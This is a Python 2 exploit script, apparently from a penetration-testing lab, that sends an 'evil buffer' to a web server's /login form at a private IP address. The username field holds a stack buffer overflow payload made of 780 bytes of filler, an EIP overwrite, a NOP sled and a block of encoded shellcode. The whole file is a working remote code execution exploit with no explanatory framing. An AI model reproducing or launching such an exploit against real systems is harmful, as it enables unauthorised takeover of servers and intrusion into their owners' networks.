#!/usr/bin/python2
import socket
import time
import sys

try:
    print("\nSending evil buffer")
    
    filler = b"A" * 780
    eip = b"\x83\x0c\x09\x10"
    offset = b"C" * 4
    shellcode = b""
    shellcode += b"\xbe\x32\xa4\x46\xf1\xda\xcd\xd9\x74\x24\xf4\x58\x31\xc9"
    shellcode += b"\xb1\x52\x31\x70\x12\x83\xc0\x04\x03\x42\xaa\xa4\x04\x5e"
    shellcode += b"\x5a\xaa\xe7\x9e\x9b\xcb\x6e\x7b\xaa\xcb\x15\x08\x9d\xfb"
    shellcode += b"\x5e\x5c\x12\x77\x32\x74\xa1\xf5\x9b\x7b\x02\xb3\xfd\xb2"
    shellcode += b"\x93\xe8\x3e\xd5\x17\xf3\x12\x35\x29\x3c\x67\x34\x6e\x21"
    shellcode += b"\x8a\x64\x27\x2d\x39\x98\x4c\x7b\x82\x13\x1e\x6d\x82\xc0"
    shellcode += b"\xd7\x8c\xa3\x57\x63\xd7\x63\x56\xa0\x63\x2a\x40\xa5\x4e"
    shellcode += b"\xe4\xfb\x1d\x24\xf7\x2d\x6c\xc5\x54\x10\x40\x34\xa4\x55"
    shellcode += b"\x67\xa7\xd3\xaf\x9b\x5a\xe4\x74\xe1\x80\x61\x6e\x41\x42"
    shellcode += b"\xd1\x4a\x73\x87\x84\x19\x7f\x6c\xc2\x45\x9c\x73\x07\xfe"
    shellcode += b"\x98\xf8\xa6\xd0\x28\xba\x8c\xf4\x71\x18\xac\xad\xdf\xcf"
    shellcode += b"\xd1\xad\xbf\xb0\x77\xa6\x52\xa4\x05\xe5\x3a\x09\x24\x15"
    shellcode += b"\xbb\x05\x3f\x66\x89\x8a\xeb\xe0\xa1\x43\x32\xf7\xc6\x79"
    shellcode += b"\x82\x67\x39\x82\xf3\xae\xfe\xd6\xa3\xd8\xd7\x56\x28\x18"
    shellcode += b"\xd7\x82\xff\x48\x77\x7d\x40\x38\x37\x2d\x28\x52\xb8\x12"
    shellcode += b"\x48\x5d\x12\x3b\xe3\xa4\xf5\x84\x5c\xd1\x94\x6d\x9f\x1d"
    shellcode += b"\x92\x54\x16\xfb\xf6\xb6\x7e\x54\x6f\x2e\xdb\x2e\x0e\xaf"
    shellcode += b"\xf1\x4b\x10\x3b\xf6\xac\xdf\xcc\x73\xbe\x88\x3c\xce\x9c"
    shellcode += b"\x1f\x42\xe4\x88\xfc\xd1\x63\x48\x8a\xc9\x3b\x1f\xdb\x3c"
    shellcode += b"\x32\xf5\xf1\x67\xec\xeb\x0b\xf1\xd7\xaf\xd7\xc2\xd6\x2e"
    shellcode += b"\x95\x7f\xfd\x20\x63\x7f\xb9\x14\x3b\xd6\x17\xc2\xfd\x80"
    shellcode += b"\xd9\xbc\x57\x7e\xb0\x28\x21\x4c\x03\x2e\x2e\x99\xf5\xce"
    shellcode += b"\x9f\x74\x40\xf1\x10\x11\x44\x8a\x4c\x81\xab\x41\xd5\xa1"
    shellcode += b"\x49\x43\x20\x4a\xd4\x06\x89\x17\xe7\xfd\xce\x21\x64\xf7"
    shellcode += b"\xae\xd5\x74\x72\xaa\x92\x32\x6f\xc6\x8b\xd6\x8f\x75\xab"
    shellcode += b"\xf2"
    nops = b"\x90" * 10
   
    inputBuffer = filler+eip+offset+nops+shellcode

    content = b"username=" + inputBuffer + b"&password=password"

    buffer = b"POST /login HTTP/1.1\r\n"
    buffer += b"Host: 192.168.145.10\r\n"
    buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer += b"Referer: http://192.168.145.10/login\r\n"
    buffer += b"Connection: close\r\n"
    buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += b"Content-Length: "+str(len(content)).encode()+b"\r\n"
    buffer += b"\r\n"
    
    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect(("192.168.145.10", 80))
    s.send(buffer)
    s.close()

    print("\nDone!")
    
except Exception as e:
    print(e)
    print("\nCould not connect!")
    sys.exit()